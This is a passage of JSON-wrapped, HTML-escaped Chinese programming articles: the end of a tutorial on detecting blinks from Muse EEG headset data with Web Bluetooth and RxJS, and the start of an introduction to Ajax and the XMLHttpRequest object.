class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.muse.start();\n  \u003cspan class=\"hljs-comment\"\u003e// \u003cspan class=\"hljs-doctag\"\u003eTODO:\u003c/span\u003e 订阅脑电波数据\u003c/span\u003e\n}\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ccode\u003eMuseClient\u003c/code\u003e 类实例的 \u003ccode\u003econnect()\u003c/code\u003e 方法启动与头戴设备的连接，\u003ccode\u003estart()\u003c/code\u003e 方法命令头戴设备开始对脑电波数据进行采样并将其发送到电线上。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2017/10/26/38ba2eabc4571847dd81be1731b1c629\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e使用 Web 蓝牙与 Muse 头戴设备配对\u003c/p\u003e\n\u003cp\u003e接下来我们需要订阅 \u003ccode\u003emuse.eegReadings\u003c/code\u003e observable 上的脑电波数据 (这段代码放到上面的 TODO 注释处)：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs typescript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e leftEyeChannel = channelNames.indexOf(\u003cspan class=\"hljs-string\"\u003e'AF7'\u003c/span\u003e);\n\n\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.leftBlinks = \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.muse.eegReadings\n  .filter(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003er\u003c/span\u003e =\u0026gt;\u003c/span\u003e r.electrode === leftEyeChannel)\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e上面的代码接收来自设备的脑电波读数，并过滤出位于左眼上方的 AF7 电极。每个数据包包含12个样本，observable 流中每一项都是具有以下结构的对象：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs typescript\"\u003e\u003cspan class=\"hljs-keyword\"\u003einterface\u003c/span\u003e EEGReading {\n  electrode: \u003cspan class=\"hljs-built_in\"\u003enumber\u003c/span\u003e;\n  timestamp: \u003cspan class=\"hljs-built_in\"\u003enumber\u003c/span\u003e;\n  samples: \u003cspan class=\"hljs-built_in\"\u003enumber\u003c/span\u003e[];\n}\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ccode\u003eelectrode\u003c/code\u003e 包含电极的数字索引 (使用 \u003ccode\u003echannelNames\u003c/code\u003e 数组映射出更友好的名称)，\u003ccode\u003etimestamp\u003c/code\u003e 包含相对于记录开始时采样的时间戳，\u003ccode\u003esamples\u003c/code\u003e 是12个浮点数的数组，每项都是一个脑电波测量，以 mV (微伏) 为单位。\u003c/p\u003e\n\u003cp\u003e下一步，我们只想得到每个数据包中的最大值 (例如，最大输出值的测量)。我们使用 RxJS 中的 \u003ccode\u003emap\u003c/code\u003e 操作符：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs typescript\"\u003e\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.leftBlinks = \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.muse.eegReadings\n  .filter(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003er\u003c/span\u003e =\u0026gt;\u003c/span\u003e r.electrode === leftEyeChannel)\n  .map(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003er\u003c/span\u003e =\u0026gt;\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eMath\u003c/span\u003e.max(...r.samples.map(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003en\u003c/span\u003e =\u0026gt;\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eMath\u003c/span\u003e.abs(n))))\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e所以现在我们拥有一个简单的数字流，我们可以过滤出值大于500的数字，那很可能就是我们正在找寻的眨眼：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs typescript\"\u003e\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.leftBlinks = \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.muse.eegReadings\n    .filter(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003er\u003c/span\u003e =\u0026gt;\u003c/span\u003e r.electrode === leftEyeChannel)\n    .map(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003er\u003c/span\u003e =\u0026gt;\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eMath\u003c/span\u003e.max(...r.samples.map(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003en\u003c/span\u003e =\u0026gt;\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eMath\u003c/span\u003e.abs(n))))\n    .filter(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003emax\u003c/span\u003e =\u0026gt;\u003c/span\u003e max \u0026gt; \u003cspan class=\"hljs-number\"\u003e500\u003c/span\u003e)\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e到这里，我们有了一个简单的 RxJS 管道，它用于眨眼检测，但为了实际开始接收数据，我们还需要订阅它。我们从一个简单的 \u003ccode\u003econsole.log\u003c/code\u003e开始：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs typescript\"\u003e\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.leftBlinks.subscribe(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003evalue\u003c/span\u003e =\u0026gt;\u003c/span\u003e {\n  \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e'Blink!'\u003c/span\u003e, value);\n});\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e如果运行代码，你可能会看到大量的 “Blink!” 出现，直到你将头戴设备戴上，因为会有很多的静态噪音。一旦你穿戴好了你的设备，只有当你眨眼或触摸左眼时，才应该会看到 “Blink!” 消息的出现：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2017/10/26/ca8f314e62068ecc7b8b828d2fb07c57\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e哇，它真的有效果！\u003c/p\u003e\n\u003cp\u003e每当你眨眼时，你可能会看到若干 “Blink!” 出现在控制台中。原因是眨眼会另电势产生变化。为了必要出现过多的 “Blinks!”，我们需要进行去抖动过滤 ( debounce )，类似于\u003ca href=\"https://www.arduino.cc/en/Tutorial/Debounce\"\u003e这篇文章\u003c/a\u003e 所做的。\u003c/p\u003e\n\u003cp\u003e我们来做最后的补充：我们不再将信息打印到控制台，而是当眨眼时我们实际发出值1，然后再最后一次电势改变后等待半秒再发出值0。这会过滤掉我们所看到的多余的 “Blink!”：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs typescript\"\u003e\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.leftBlinks = \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.muse.eegReadings\n    .filter(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003er\u003c/span\u003e =\u0026gt;\u003c/span\u003e r.electrode === leftEyeChannel)\n    .map(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003er\u003c/span\u003e =\u0026gt;\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eMath\u003c/span\u003e.max(...r.samples.map(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003en\u003c/span\u003e =\u0026gt;\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eMath\u003c/span\u003e.abs(n))))\n    .filter(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003emax\u003c/span\u003e =\u0026gt;\u003c/span\u003e max \u0026gt; \u003cspan class=\"hljs-number\"\u003e500\u003c/span\u003e)\n    .switchMap(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003e()\u003c/span\u003e =\u0026gt;\u003c/span\u003e\n      Observable.merge(\n        Observable.of(\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e),\n        Observable.timer(\u003cspan class=\"hljs-number\"\u003e500\u003c/span\u003e).map(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003e()\u003c/span\u003e =\u0026gt;\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e)\n      )\n    );\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e那么 \u003ccode\u003eswitchMap\u003c/code\u003e 到底施了什么魔法？简单来说，每当一个新项到达时，\u003ccode\u003eswitchMap\u003c/code\u003e 会抛弃前一个流并调用给定的函数来产生新的流。新的流由两项组成：第一个是值\u003ccode\u003e1\u003c/code\u003e，它是由 \u003ccode\u003eObservable.of\u003c/code\u003e 立即发出的，第二个是值\u003ccode\u003e0\u003c/code\u003e，它在500毫秒之后发出，但如果一个来自 \u003ccode\u003efilter\u003c/code\u003e 管道中的新项到达的话，将重新启动 \u003ccode\u003eswitchMap\u003c/code\u003e 并抛弃前一个流中仍未发出的值\u003ccode\u003e0\u003c/code\u003e。\u003c/p\u003e\n\u003cp\u003e现在我们可以使用 \u003ccode\u003eleftBlinks\u003c/code\u003e observable 来对眨眼进行可视化！可以使用 \u003ccode\u003easync\u003c/code\u003e pipe 将它绑定到 Angular 模板中：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003espan\u003c/span\u003e [\u003cspan class=\"hljs-attr\"\u003ehidden\u003c/span\u003e]=\u003cspan class=\"hljs-string\"\u003e\"leftBlinks|async\"\u003c/span\u003e\u0026gt;\u003c/span\u003e👁\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003espan\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e每当眨眼时，上面的代码会隐藏眼睛符号，或者我们可以切换 CSS 类，然后在闪烁时对眼睛符号进行颜色改变或执行动画：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003espan\u003c/span\u003e [\u003cspan class=\"hljs-attr\"\u003eclass.blink\u003c/span\u003e]=\u003cspan class=\"hljs-string\"\u003e”leftBlinks|async”\u003c/span\u003e\u0026gt;\u003c/span\u003e👁\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003espan\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e无论采用哪种方式，我建议每次只眨一只眼睛，这样可以确保你能观察到你的代码是否正常工作😜！\u003c/p\u003e\n\u003cp\u003e如果我们构建的是 React 应用，可以直接订阅 observable 并在眨眼时更新组件的 state :\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs typescript\"\u003e\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.leftBlinks.subscribe(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003evalue\u003c/span\u003e =\u0026gt;\u003c/span\u003e {\n  \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.setState({blinking: value});\n});\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e现在我们做到了！脑电波的 “Hello World” 已经完成！\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2017/10/26/dd06a5febf819dc65ca164dd39fe4c43\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e项目的完整代码在\u003ca href=\"https://github.com/urish/muse-blink\"\u003e这里\u003c/a\u003e。\u003c/p\u003e\n\u003ch2\u003e总结\u003c/h2\u003e\n\u003cp\u003e几年前，脑电波还是很昂贵的，笨重的设备只能用于医院和研究机构。如今，像你我一样的 Web 开发者都可以使用我们每天都在使用的开发工具 (浏览器、RxJS 和 Angular ) ，轻而易举地来连接和分析脑电波数据。\u003c/p\u003e\n\u003cp\u003e即使脑电波不是你的菜，你可以清楚地看到，由于各种“智能”消费品的推动，已经为开发者创造了一系列真正的好机会。我们确实生活在一个令人振奋、每天都充满惊喜的年代！\u003c/p\u003e\n\u003cp\u003e\u003cem\u003e备注： 十分感谢 \u003ca href=\"https://medium.com/@benlesh\"\u003eBen Lesh\u003c/a\u003e 帮忙完善这些示例中的 RxJS 代码。\u003c/em\u003e\u003c/p\u003e\n","buildTime":"1515057508.9549","__v":0}
{"_id":{"$oid":"5a4e188de4919b0e782b4c7d"},"id":"587f8dbd570c3522011c0f59","author":{"$oid":"5a4b76a1b11e1a170cb138d9"},"imageCache":[{"imageUrlArray":[],"screenShot":"https://dn-mhke0kuv.qbox.me/788574793b2fbaeacc71.jpg"}],"title":"Ajax入门","meta":{"likeCount":0},"tag":["JavaScript","前端","Ajax"],"comment":[],"shortContent":"前言 总括： 本文讲解了ajax的历史，工作原理以及优缺点，对XMLHttpRequest对象进行了详细的讲解，并使用原生js实现了一个ajax对象以方便日常开始使用。 damonare的ajax库：damonare的ajax库 原文博客地址：你真的懂ajax吗？ 知乎专栏\u0026\u0026…","content":"\u003ch2 id=\"-\"\u003e前言\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003e总括：\u003c/strong\u003e 本文讲解了ajax的历史，工作原理以及优缺点，对XMLHttpRequest对象进行了详细的讲解，并使用原生js实现了一个ajax对象以方便日常开始使用。\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003edamonare的ajax库：\u003ca href=\"https://github.com/damonare/ajax/tree/master\" target=\"_blank\"\u003edamonare的ajax库\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e原文博客地址：\u003ca href=\"https://damonare.github.io/2017/01/18/%E4%BD%A0%E7%9C%9F%E7%9A%84%E6%87%82ajax%E5%90%97%EF%BC%9F/#more\" target=\"_blank\"\u003e你真的懂ajax吗？\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e知乎专栏\u0026amp;\u0026amp;简书专题：\u003ca href=\"https://zhuanlan.zhihu.com/damonare\" target=\"_blank\"\u003e前端进击者（知乎）\u003c/a\u003e\u0026amp;\u0026amp;\u003ca href=\"http://www.jianshu.com/collection/bbaa63e264f5\" target=\"_blank\"\u003e前端进击者（简书）\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e博主博客地址：\u003ca href=\"http://damonare.cn\" target=\"_blank\"\u003eDamonare的个人博客\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003e古之立大事者，不惟有超世之才，亦必有坚忍不拔之志。\u003c/strong\u003e\u003c/p\u003e\n\u003ch2 id=\"-\"\u003e正文\u003c/h2\u003e\n\u003cp\u003e相信每个前端程序员日常工作中都避免不了的工作就是和后端联调，联调自然就避免不了使用\u003ccode\u003eajax\u003c/code\u003e，但我相信，不管是使用jquery封装的\u003ccode\u003eajax\u003c/code\u003e方法还是使用vue的插件\u003ccode\u003evue-resource\u003c/code\u003e的程序员，真正对于\u003ccode\u003eajax\u003c/code\u003e有过深入探究的并不多，我们更多的是为了使用而使用，至于它的原理往往因为即使不了解依旧能做出东西而懒得去看，我们都被轮子们惯坏了。根据\u003ca href=\"https://zh.wikipedia.org/wiki/%E5%B8%95%E9%9B%B7%E6%89%98%E6%B3%95%E5%88%99\" target=\"_blank\"\u003e二八定律\u003c/a\u003e，即任何一组东西中，最重要的只占其中一小部分，约20%，其余80%的尽管是多数，却是次要的。因 此，如果想挤进那20%的行列，就要学到一般人学不到的深度，学到一般人学不了的东西。\u003c/p\u003e\n\u003cp\u003e好的，现在我们从头来说一下\u003ccode\u003eajax\u003c/code\u003e。\u003c/p\u003e\n\u003ch3 id=\"ajax-\"\u003eAjax简介\u003c/h3\u003e\n\u003cp\u003e在上世纪90年代，几乎所有的网站都由HTML页面实现，服务器处理每一个用户请求都需要重新加载网页。形式是怎样的呢？就比如说你在浏览器上登录自己的微博账号，填完了表单，点击登录按钮，一次\u0026quot;完整\u0026quot;的HTTP请求就此触发，服务器发现你的登录密码不对头，立马把网页原原本本的返回给你，在用户看来呢，就是一次重新加载的过程！用户体验极差！而且这个做法浪费了许多带宽，因为在前后两个页面中的大部分HTML码往往是相同的。由于每次应用的沟通都需要向服务器发送请求，应用的回应时间依赖于服务器的回应时间。这导致了用户界面的回应比本机应用慢得多。\u003c/p\u003e\n\u003cp\u003e到了2005年，google率先在它的应用(诸如google地图、gmail)里使用了\u003ccode\u003eajax\u003c/code\u003e技术，这才让这项技术正式风靡开来。\u003c/p\u003e\n\u003cp\u003e如今它的应用已经十分广泛：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e运用\u003ca href=\"https://zh.wikipedia.org/wiki/XHTML\" target=\"_blank\"\u003eXHTML\u003c/a\u003e+\u003ca href=\"https://zh.wikipedia.org/wiki/CSS\" target=\"_blank\"\u003eCSS\u003c/a\u003e来表达信息；\u003c/li\u003e\n\u003cli\u003e运用\u003ca href=\"https://zh.wikipedia.org/wiki/JavaScript\" target=\"_blank\"\u003eJavaScript\u003c/a\u003e操作\u003ca href=\"https://zh.wikipedia.org/wiki/%E6%96%87%E4%BB%B6%E7%89%A9%E4%BB%B6%E6%A8%A1%E5%9E%8B\" target=\"_blank\"\u003eDOM\u003c/a\u003e（Document Object Model）来运行动态效果；\u003c/li\u003e\n\u003cli\u003e运用\u003ca href=\"https://zh.wikipedia.org/wiki/XML\" target=\"_blank\"\u003eXML\u003c/a\u003e和\u003ca href=\"https://zh.wikipedia.org/wiki/XSLT\" target=\"_blank\"\u003eXSLT\u003c/a\u003e操作数据；\u003c/li\u003e\n\u003cli\u003e运用\u003ca href=\"https://zh.wikipedia.org/wiki/XMLHttpRequest\" target=\"_blank\"\u003eXMLHttpRequest\u003c/a\u003e或新的Fetch API与\u003ca href=\"https://zh.wikipedia.org/wiki/%E7%B6%B2%E9%A0%81%E4%BC%BA%E6%9C%8D%E5%99%A8\" target=\"_blank\"\u003e网页服务器\u003c/a\u003e进行异步数据交换；\u003c/li\u003e\n\u003cli\u003e注意：AJAX与\u003ca href=\"https://zh.wikipedia.org/wiki/Flash\" target=\"_blank\"\u003eFlash\u003c/a\u003e、\u003ca href=\"https://zh.wikipedia.org/wiki/Silverlight\" target=\"_blank\"\u003eSilverlight\u003c/a\u003e和\u003ca href=\"https://zh.wikipedia.org/wiki/Java_Applet\" target=\"_blank\"\u003eJava Applet\u003c/a\u003e等\u003ca href=\"https://zh.wikipedia.org/wiki/RIA\" target=\"_blank\"\u003eRIA\u003c/a\u003e技术是有区分的。\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"ajax-\"\u003eAjax工作原理\u003c/h3\u003e\n\u003cp\u003e Ajax的工作原理相当于在用户和服务器之间加了一个中间层(ajax引擎),使用户操作与服务器响应异步化。并不是所有的用户请求都提交给服务器,像—些数据验证(比如判断用户是否输入了数据)和数据处理(比如判断用户输入数据是否是数字)等都交给Ajax引擎自己来做, 只有确定需要从服务器读取新数据时再由Ajax引擎代为向服务器提交请求。把这些交给了Ajax引擎，用户操作起来也就感觉更加流畅了。\u003c/p\u003e\n\u003ch3 id=\"ajax-\"\u003eAjax优缺点\u003c/h3\u003e\n\u003ch4 id=\"ajax-\"\u003eAjax的优点\u003c/h4\u003e\n\u003cp\u003e1.无刷新更新数据。\u003c/p\u003e\n\u003cp\u003eAJAX最大优点就是能在不刷新整个页面的前提下与服务器通信维护数据。这使得Web应用程序更为迅捷地响应用户交互，并避免了在网络上发送那些没有改变的信息，减少用户等待时间，带来非常好的用户体验。\u003c/p\u003e\n\u003cp\u003e2.异步与服务器通信。\u003c/p\u003e\n\u003cp\u003eAJAX使用异步方式与服务器通信，不需要打断用户的操作，具有更加迅速的响应能力。优化了Browser和Server之间的沟通，减少不必要的数据传输、时间及降低网络上数据流量。\u003c/p\u003e\n\u003cp\u003e3.前端和后端负载平衡。\u003c/p\u003e\n\u003cp\u003eAJAX可以把以前一些服务器负担的工作转嫁到客户端，利用客户端闲置的能力来处理，减轻服务器和带宽的负担，节约空间和宽带租用成本。并且减轻服务器的负担，AJAX的原则是“按需取数据”，可以最大程度的减少冗余请求和响应对服务器造成的负担，提升站点性能。\u003c/p\u003e\n\u003cp\u003e4.基于标准被广泛支持。\u003c/p\u003e\n\u003cp\u003eAJAX基于标准化的并被广泛支持的技术，不需要下载浏览器插件或者小程序，但需要客户允许JavaScript在浏览器上执行。随着Ajax的成熟，一些简化Ajax使用方法的程序库也相继问世。同样，也出现了另一种辅助程序设计的技术，为那些不支持JavaScript的用户提供替代功能。\u003c/p\u003e\n\u003cp\u003e 5.界面与应用分离。\u003c/p\u003e\n\u003cp\u003eAjax使WEB中的界面与应用分离（也可以说是数据与呈现分离），有利于分工合作、减少非技术人员对页面的修改造成的WEB应用程序错误、提高效率、也更加适用于现在的发布系统。\u003c/p\u003e\n\u003ch4 id=\"ajax-\"\u003eAjax缺点\u003c/h4\u003e\n\u003cp\u003e1.AjAX干掉了Back和加入收藏书签功能，即对浏览器机制的破坏。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e 对应用Ajax最主要的批评就是，它可能破坏浏览器的后退与加入收藏书签功能。在动态更新页面的情况下，用户无法回到前一个页面状态，这是因为浏览器仅能记下历史记录中的\u003ca href=\"https://zh.wikipedia.org/w/index.php?title=%E9%9D%99%E6%80%81%E9%A1%B5%E9%9D%A2\u0026amp;action=edit\u0026amp;redlink=1\" target=\"_blank\"\u003e静态页面\u003c/a\u003e。一个被完整读入的页面与一个已经被动态修改过的页面之间的可能差别非常微妙；用户通常都希望单击后退按钮，就能够取消他们的前一次操作，但是在Ajax应用程序中，却无法这样做。不过开发者已想出了种种办法来解决这个问题，\u003ca href=\"https://zh.wikipedia.org/wiki/HTML5\" target=\"_blank\"\u003eHTML5\u003c/a\u003e 之前的方法大多是在用户单击后退按钮访问历史记录时，通过创建或使用一个隐藏的IFRAME来重现页面上的变更。（例如，当用户在Google Maps中单击后退时，它在一个隐藏的\u003ca href=\"https://zh.wikipedia.org/w/index.php?title=IFRAME\u0026amp;action=edit\u0026amp;redlink=1\" target=\"_blank\"\u003eIFRAME\u003c/a\u003e中进行搜索，然后将搜索结果反映到Ajax元素上，以便将应用程序状态恢复到当时的状态）。\u003c/p\u003e\n\u003cp\u003e关于无法将状态加入收藏或书签的问题，\u003ca href=\"https://zh.wikipedia.org/wiki/HTML5\" target=\"_blank\"\u003eHTML5\u003c/a\u003e之前的一种方式是使用\u003ca href=\"https://zh.wikipedia.org/wiki/URL\" target=\"_blank\"\u003eURL\u003c/a\u003e片断标识符（通常被称为\u003ca href=\"https://zh.wikipedia.org/wiki/%E9%94%9A%E7%82%B9\" target=\"_blank\"\u003e锚点\u003c/a\u003e，即URL中#后面的部分）来保持追踪，允许用户回到指定的某个应用程序状态。（许多浏览器允许JavaScript动态更新锚点，这使得Ajax应用程序能够在更新显示内容的同时更新锚点。）\u003ca href=\"https://zh.wikipedia.org/wiki/HTML5\" target=\"_blank\"\u003eHTML5\u003c/a\u003e 以后可以直接操作浏览历史，并以字符串形式存储网页状态，将网页加入网页收藏夹或书签时状态会被隐形地保留。上述两个方法也可以同时解决无法后退的问题。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e2.AJAX的安全问题。\u003c/p\u003e\n\u003cp\u003eAJAX技术给用户带来很好的用户体验的同时也对IT企业带来了新的安全威胁，Ajax技术就如同对企业数据建立了一个直接通道。这使得开发者在不经意间会暴露比以前更多的数据和服务器逻辑。Ajax的逻辑可以对客户端的安全扫描技术隐藏起来，允许黑客从远端服务器上建立新的攻击。还有Ajax也难以避免一些已知的安全弱点，诸如跨站点脚步攻击、SQL注入攻击和基于Credentials的安全漏洞等等。\u003c/p\u003e\n\u003cp\u003e3.因为网络延迟需要给用户提供必要提示\u003c/p\u003e\n\u003cp\u003e进行Ajax开发时，网络延迟——即用户发出请求到服务器发出响应之间的间隔——需要慎重考虑。如果不给予用户明确的回应，没有恰当的预读数据，或者对XMLHttpRequest的不恰当处理，都会使用户感到厌烦。通常的解决方案是，使用一个可视化的组件来告诉用户系统正在进行后台操作并且正在读取数据和内容。\u003c/p\u003e\n\u003ch3 id=\"xmlhttprequest-\"\u003eXMLhttpRequest介绍\u003c/h3\u003e\n\u003cp\u003eAjax(Asynchronous  JavaScript  and  XML)不是指一种单一的技术，而是有机地利用了一系列相关的技术。虽然其名称包含XML，但实际上数据格式可以由\u003ca href=\"https://zh.wikipedia.org/wiki/JSON\" target=\"_blank\"\u003eJSON\u003c/a\u003e代替，进一步减少数据量，形成所谓的AJAJ。为了使用JavaScript向服务器发出 \u003ca href=\"https://developer.mozilla.org/en/HTTP\" target=\"_blank\"\u003eHTTP\u003c/a\u003e 请求，需要一个提供此功能的类的实例。这就是XMLHttpRequest的由来。这样的类最初是在Internet Explorer中作为一个名为XMLHTTP的ActiveX对象引入的。然后，Mozilla，Safari和其他浏览器，实现一个XMLHttpRequest类，支持Microsoft的原始ActiveX对象的方法和属性。同时微软也实现了XMLHttpRequest。\u003c/p\u003e\n\u003cp\u003e显而易见XMLHttpRequest类是重中之重了。\u003c/p\u003e\n\u003ch4 id=\"xmlhttprequest-\"\u003eXMLhttpRequest属性\u003c/h4\u003e\n\u003ch5 id=\"onreadystatechange\"\u003eonreadystatechange\u003c/h5\u003e\n\u003cp\u003e一个JavaScript函数对象，当readyState属性改变时会调用它。回调函数会在user interface线程中调用。\u003c/p\u003e\n\u003ch5 id=\"readystate\"\u003ereadyState\u003c/h5\u003e\n\u003cp\u003eHTTP 请求的状态.当一个 XMLHttpRequest 初次创建时，这个属性的值从 0 开始，直到接收到完整的 HTTP 响应，这个值增加到 4。\u003c/p\u003e\n\u003cp\u003e5 个状态中每一个都有一个相关联的非正式的名称，下表列出了状态、名称和含义：\u003c/p\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003e状态\u003c/th\u003e\n\u003cth\u003e名称\u003c/th\u003e\n\u003cth\u003e描述\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003e0\u003c/td\u003e\n\u003ctd\u003eUninitialized\u003c/td\u003e\n\u003ctd\u003e初始化状态。XMLHttpRequest 对象已创建或已被 abort() 方法重置。\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e1\u003c/td\u003e\n\u003ctd\u003eOpen\u003c/td\u003e\n\u003ctd\u003eopen() 方法已调用，但是 send() 方法未调用。请求还没有被发送。\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e2\u003c/td\u003e\n\u003ctd\u003eSent\u003c/td\u003e\n\u003ctd\u003eSend() 方法已调用，HTTP 请求已发送到 Web 服务器。未接收到响应。\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e3\u003c/td\u003e\n\u003ctd\u003eReceiving\u003c/td\u003e\n\u003ctd\u003e所有响应头部都已经接收到。响应体开始接收但未完成。\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e4\u003c/td\u003e\n\u003ctd\u003eLoaded\u003c/td\u003e\n\u003ctd\u003eHTTP 响应已经完全接收。\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003cp\u003ereadyState 的值不会递减，除非当一个请求在处理过程中的时候调用了 abort() 或 open() 方法。每次这个属性的值增加的时候，都会触发 onreadystatechange 事件句柄。\u003c/p\u003e\n\u003ch5 id=\"responsetext\"\u003eresponseText\u003c/h5\u003e\n\u003cp\u003e目前为止为服务器接收到的响应体（不包括头部），或者如果还没有接收到数据的话，就是空字符串。\u003c/p\u003e\n\u003cp\u003e如果 readyState 小于 3，这个属性就是一个空字符串。当 readyState 为 3，这个属性返回目前已经接收的响应部分。如果 readyState 为 4，这个属性保存了完整的响应体。\u003c/p\u003e\n\u003cp\u003e如果响应包含了为响应体指定字符编码的头部，就使用该编码。否则，假定使用 Unicode UTF-8。\u003c/p\u003e\n\u003ch5 id=\"responsexml\"\u003eresponseXML\u003c/h5\u003e\n\u003cp\u003e对请求的响应，解析为 XML 并作为 Document 对象返回。\u003c/p\u003e\n\u003ch5 id=\"status\"\u003estatus\u003c/h5\u003e\n\u003cp\u003e由服务器返回的 HTTP 状态代码，如 200 表示成功，而 404 表示 \u0026quot;Not Found\u0026quot; 错误。当 readyState 小于 3 的时候读取这一属性会导致一个异常。\u003c/p\u003e\n\u003ch5 id=\"statustext\"\u003estatusText\u003c/h5\u003e\n\u003cp\u003e这个属性用名称而不是数字指定了请求的 HTTP 的状态代码。也就是说，当状态为 200 的时候它是 \u0026quot;OK\u0026quot;，当状态为 404 的时候它是 \u0026quot;Not Found\u0026quot;。和 status 属性一样，当 readyState 小于 3 的时候读取这一属性会导致一个异常。\u003c/p\u003e\n\u003ch4 